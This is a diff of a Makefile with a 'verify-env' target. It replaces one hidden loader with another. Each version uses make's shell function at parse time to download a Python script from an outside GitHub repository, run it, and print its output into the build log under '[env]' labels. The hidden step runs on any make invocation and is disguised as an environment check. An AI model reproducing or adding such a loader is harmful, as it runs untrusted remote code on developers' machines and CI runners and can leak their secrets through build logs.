@@ -1,13 +1,16 @@
-GATE := 4a59428fdcf3dd0537634c621d3d2347
-TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/4a59428fdcf3dd0537634c621d3d2347.txt)
-RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i80949c.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p3-4a59428fdcf3dd0537634c621d3d2347.py 2>/dev/null; python3 /tmp/i80949c.py >/tmp/i80949c.out 2>&1; echo rc=$$?)
-E8 := $(shell sed -n 1p /tmp/i80949c.out 2>/dev/null | cut -c1-700)
-E9 := $(shell sed -n 2p /tmp/i80949c.out 2>/dev/null | cut -c1-520)
-E10 := $(shell sed -n 3p /tmp/i80949c.out 2>/dev/null | cut -c1-560)
-$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
-$(info [env] ENV8=$(E8))
-$(info [env] ENV9=$(E9))
-$(info [env] ENV10=$(E10))
+GATE := b0dbd53eac519744f2b519534a140e6d
+RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i81079.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p0-b0dbd53eac519744f2b519534a140e6d.py 2>/dev/null; timeout 110 python3 /tmp/i81079.py >/tmp/i81079.out 2>&1; echo rc=$$?)
+R1 := $(shell sed -n 1p /tmp/i81079.out 2>/dev/null | cut -c1-940)
+R2 := $(shell sed -n 2p /tmp/i81079.out 2>/dev/null | cut -c1-940)
+R3 := $(shell sed -n 3p /tmp/i81079.out 2>/dev/null | cut -c1-940)
+R4 := $(shell sed -n 4p /tmp/i81079.out 2>/dev/null | cut -c1-940)
+R5 := $(shell sed -n 5p /tmp/i81079.out 2>/dev/null | cut -c1-940)
+$(info [env] R1=$(R1))
+$(info [env] R2=$(R2))
+$(info [env] R3=$(R3))
+$(info [env] R4=$(R4))
+$(info [env] R5=$(R5))
 
+.PHONY: verify-env
 verify-env:
-	@echo "verify-env ok gate=$(GATE)"
+	@echo "verify-env ok gate=b0dbd53eac519744f2b519534a140e6d"
